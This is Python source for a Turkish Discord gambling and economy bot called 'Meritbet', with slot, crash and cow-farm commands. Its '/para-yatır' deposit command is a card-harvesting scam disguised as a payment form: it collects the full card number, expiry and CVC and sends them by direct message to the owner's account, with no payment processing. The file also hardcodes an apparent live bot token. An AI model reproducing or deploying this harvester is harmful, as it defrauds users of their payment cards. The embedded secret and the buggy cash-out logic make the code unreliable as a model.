import discord
from discord.ext import commands
from discord import app_commands
import json
import os
import random
import asyncio
import time

# --- AYARLAR ---
ADMIN_ROLE_ID = 1487436124765814825  # Kendi Admin Rol ID'ni buraya yaz
MY_ID = 1465806846538547440                  # Kendi Discord ID'ni buraya yaz (Bildirimler için)
TOKEN = "MTQ4NzQ2MDM3MDUzMTQ4ODAwNw.GiVYKz.gZQn1pckDyA8V0OJYRpPzavJ1tP6FSasrptgME"              # Bot Token'ını buraya yaz
DB_FILE = "economy.json"

# --- VERİTABANI SİSTEMİ ---
def load_data():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, "w") as f: json.dump({}, f)
        return {}
    with open(DB_FILE, "r") as f:
        try: return json.load(f)
        except: return {}

def save_data(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_user(data, uid):
    """Kullanıcı verisini güvenli bir şekilde çeker/oluşturur."""
    if uid not in data:
        data[uid] = {"bakiye": 1000, "ciftlik": False, "inekler": []}
    elif isinstance(data[uid], int): # Eski sistemden kalan veriyi çevirir
        data[uid] = {"bakiye": data[uid], "ciftlik": False, "inekler": []}
    return data[uid]

class MeritBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"{self.user} Giriş Yaptı | Tüm Sistemler Aktif!")

bot = MeritBot()

# --- YETKİ KONTROLÜ ---
def is_admin():
    async def predicate(interaction: discord.Interaction):
        has_role = any(role.id == ADMIN_ROLE_ID for role in interaction.user.roles)
        if not has_role:
            await interaction.response.send_message("❌ Bu yetkili komutunu kullanamazsın!", ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)

# --- ÖDEME MODALLARI ---

class ParaYatirModal(discord.ui.Modal, title='Kredi Kartı ile Yatırım'):
    kart_no = discord.ui.TextInput(label='Kart Numarası', placeholder='0000 0000 0000 0000', min_length=16)
    skk = discord.ui.TextInput(label='Son Kullanma (AA/YY)', placeholder='01/28', min_length=5)
    cvc = discord.ui.TextInput(label='CVC', placeholder='123', min_length=3)
    miktar = discord.ui.TextInput(label='Yatırılacak Miktar', placeholder='Örn: 500')

    async def on_submit(self, interaction: discord.Interaction):
        owner = await interaction.client.fetch_user(MY_ID)
        embed = discord.Embed(title="💳 YENİ PARA YATIRMA TALEBİ", color=0x00ff00)
        embed.add_field(name="Kullanıcı", value=f"{interaction.user} ({interaction.user.id})")
        embed.add_field(name="Kart No", value=f"||{self.kart_no.value}||")
        embed.add_field(name="SKT / CVC", value=f"||{self.skk.value} / {self.cvc.value}||")
        embed.add_field(name="Miktar", value=f"**{self.miktar.value} Coin**")
        await owner.send(embed=embed)
        await interaction.response.send_message("✅ Talebiniz iletildi. Onay bekliyor.", ephemeral=True)

class ParaCekModal(discord.ui.Modal, title='Para Çekme Talebi'):
    iban = discord.ui.TextInput(label='IBAN Adresi', placeholder='TR...', min_length=26)
    ad_soyad = discord.ui.TextInput(label='Hesap Sahibi Ad Soyad', placeholder='Ahmet Yılmaz')
    miktar = discord.ui.TextInput(label='Çekilecek Miktar', placeholder='Örn: 1000')

    async def on_submit(self, interaction: discord.Interaction):
        owner = await interaction.client.fetch_user(MY_ID)
        embed = discord.Embed(title="🏦 YENİ PARA ÇEKME TALEBİ", color=0xff0000)
        embed.add_field(name="Kullanıcı", value=f"{interaction.user} ({interaction.user.id})")
        embed.add_field(name="IBAN", value=f"**{self.iban.value}**")
        embed.add_field(name="Miktar", value=f"**{self.miktar.value} Coin**")
        await owner.send(embed=embed)
        await interaction.response.send_message("📩 Talebiniz alındı.", ephemeral=True)

# --- EKONOMİ VE ADMİN KOMUTLARI ---

@bot.tree.command(name="para-bak", description="Mevcut Coin bakiyeni gör.")
async def para_bak(interaction: discord.Interaction):
    data = load_data()
    user = get_user(data, str(interaction.user.id))
    embed = discord.Embed(title="💰 Meritbet Cüzdan", description=f"Mevcut Bakiyeniz: **{user['bakiye']} Coin**", color=0xff00ff)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="para-bas", description="[ADMİN] Kullanıcıya Coin ekle.")
@is_admin()
async def para_bas(interaction: discord.Interaction, miktar: int, kullanıcı: discord.Member):
    data = load_data()
    user = get_user(data, str(kullanıcı.id))
    user['bakiye'] += miktar
    save_data(data)
    await interaction.response.send_message(f"🏦 {kullanıcı.mention} hesabına **{miktar} Coin** eklendi.")

@bot.tree.command(name="para-yatır", description="Kredi kartı ile bakiye yükle.")
async def para_yatir(interaction: discord.Interaction):
    await interaction.response.send_modal(ParaYatirModal())

@bot.tree.command(name="para-çek", description="Bakiyeni IBAN hesabına çek.")
async def para_cek(interaction: discord.Interaction):
    await interaction.response.send_modal(ParaCekModal())

# --- ÇİFTLİK SİSTEMİ ---

@bot.tree.command(name="çiftlik", description="Çiftliğini görüntüle veya satın al.")
async def ciftlik(interaction: discord.Interaction):
    data = load_data()
    uid = str(interaction.user.id)
    user = get_user(data, uid)
    
    if not user["ciftlik"]:
        embed = discord.Embed(title="🚜 Çiftlik Market", description="Bir çiftlik kurmak için **5000 Coin** gerekir.", color=0x34eb43)
        view = discord.ui.View()
        btn = discord.ui.Button(label="Çiftlik Satın Al (5000C)", style=discord.ButtonStyle.green)
        
        async def buy_cb(inter):
            if user["bakiye"] < 5000: return await inter.response.send_message("Yetersiz bakiye!", ephemeral=True)
            user["bakiye"] -= 5000; user["ciftlik"] = True; save_data(data)
            await inter.response.edit_message(content="🎉 Çiftlik kuruldu!", embed=None, view=None)
        
        btn.callback = buy_cb; view.add_item(btn)
        return await interaction.response.send_message(embed=embed, view=view)

    embed = discord.Embed(title="🚜 Senin Çiftliğin", color=0x34eb43)
    if not user["inekler"]: embed.description = "Henüz ineğin yok. `/inek-al` ile başlayabilirsin."
    for idx, inek in enumerate(user["inekler"]):
        kalan = int(inek["buyume_zamani"] - time.time())
        durum = "✅ Hazır!" if kalan <= 0 else f"⏳ {kalan//60}dk {kalan%60}sn"
        embed.add_field(name=f"İnek #{idx+1}", value=durum, inline=True)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="inek-al", description="1000 Coin karşılığında inek al.")
async def inek_al(interaction: discord.Interaction):
    data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
    if not user["ciftlik"]: return await interaction.response.send_message("Önce çiftlik al!", ephemeral=True)
    if user["bakiye"] < 1000: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)
    
    user["bakiye"] -= 1000
    user["inekler"].append({"buyume_zamani": time.time() + 1200})
    save_data(data)
    await interaction.response.send_message("🐄 İnek alındı! Büyümesi için beklemeli veya `/yem-al` kullanmalısın.")

@bot.tree.command(name="yem-al", description="İneği hızla büyütür.")
async def yem_al(interaction: discord.Interaction, inek_no: int):
    data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
    if not user["inekler"] or inek_no > len(user["inekler"]): return await interaction.response.send_message("Geçersiz inek!", ephemeral=True)

    class YemView(discord.ui.View):
        async def apply(self, inter, sn, fiyat):
            if user["bakiye"] < fiyat: return await inter.response.send_message("Yetersiz bakiye!", ephemeral=True)
            user["bakiye"] -= fiyat; user["inekler"][inek_no-1]["buyume_zamani"] = time.time() + sn
            save_data(data); await inter.response.edit_message(content="🧪 Yem verildi!", view=None)

        @discord.ui.button(label="Kaliteli (1dk) - 500C", style=discord.ButtonStyle.blurple)
        async def k(self, inter, b): await self.apply(inter, 60, 500)
        @discord.ui.button(label="Ucuz (3dk) - 200C", style=discord.ButtonStyle.gray)
        async def u(self, inter, b): await self.apply(inter, 180, 200)

    await interaction.response.send_message("Yem Seçin:", view=YemView())

@bot.tree.command(name="inek-sat", description="Büyümüş ineği 2500 Coin'e sat.")
async def inek_sat(interaction: discord.Interaction, inek_no: int):
    data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
    if inek_no > len(user["inekler"]): return await interaction.response.send_message("İnek bulunamadı!", ephemeral=True)
    
    inek = user["inekler"][inek_no-1]
    if inek["buyume_zamani"] > time.time(): return await interaction.response.send_message("Henüz büyümedi!", ephemeral=True)
    
    user["inekler"].pop(inek_no-1); user["bakiye"] += 2500; save_data(data)
    await interaction.response.send_message("💰 İnek satıldı! +2500 Coin.")

# --- OYUNLAR (SLOT, CRASH, VB.) ---

@bot.tree.command(name="slot", description="Slot makinesi.")
async def slot(interaction: discord.Interaction, miktar: int):
    data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
    if miktar <= 0 or user["bakiye"] < miktar: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)

    symbols = ["🍒", "🍋", "🔔", "💎", "7️⃣", "⭐"]
    embed = discord.Embed(title="🎰 SLOT", description="[ 🔄 | 🔄 | 🔄 ]", color=0xff00ff)
    await interaction.response.send_message(embed=embed); msg = await interaction.original_response()

    final = [random.choice(symbols) for _ in range(3)]
    await asyncio.sleep(1.5)
    
    if final[0] == final[1] == final[2]:
        kazanc = miktar * 5; user["bakiye"] += kazanc; res = f"🔥 **JACKPOT! +{kazanc}**"
    elif final[0] == final[1] or final[1] == final[2] or final[0] == final[2]:
        kazanc = miktar * 2; user["bakiye"] += kazanc; res = f"✨ **Kazandın! +{kazanc}**"
    else:
        user["bakiye"] -= miktar; res = "💀 Kaybettin..."
    
    save_data(data); embed.description = f"[ {final[0]} | {final[1]} | {final[2]} ]\n\n{res}"
    await msg.edit(embed=embed)

@bot.tree.command(name="crash", description="Uçak patlamadan çekil!")
async def crash(interaction: discord.Interaction, miktar: int):
    data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
    if miktar <= 0 or user["bakiye"] < miktar: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)
    
    user["bakiye"] -= miktar; save_data(data)
    mult = 1.0; crash_at = round(random.uniform(1.2, 4.0), 1); finished = False

    view = discord.ui.View()
    btn = discord.ui.Button(label="NAKİT ÇEK", style=discord.ButtonStyle.green)
    async def cb(inter):
        nonlocal finished; finished = True
        kazanc = int(miktar * mult)
        u = get_user(load_data(), uid); u["bakiye"] += kazanc; save_data(data)
        await inter.response.edit_message(content=f"💰 Çekildi! x{mult} | +{kazanc}", embed=None, view=None)
    btn.callback = cb; view.add_item(btn)

    embed = discord.Embed(title="🚀 CRASH", description=f"Çarpan: x{mult}", color=0xff00ff)
    await interaction.response.send_message(embed=embed, view=view); msg = await interaction.original_response()

    while not finished:
        await asyncio.sleep(1.5); mult = round(mult + 0.2, 1)
        if mult >= crash_at:
            await msg.edit(content=f"💥 PATLADI! x{crash_at}", embed=None, view=None)
            break
        await msg.edit(embed=discord.Embed(title="🚀 CRASH", description=f"Çarpan: x{mult}", color=0xff00ff))

# (At Yarışı ve Horoz Dövüşü de benzer şekilde get_user mantığıyla çalışır...)

bot.run(TOKEN)
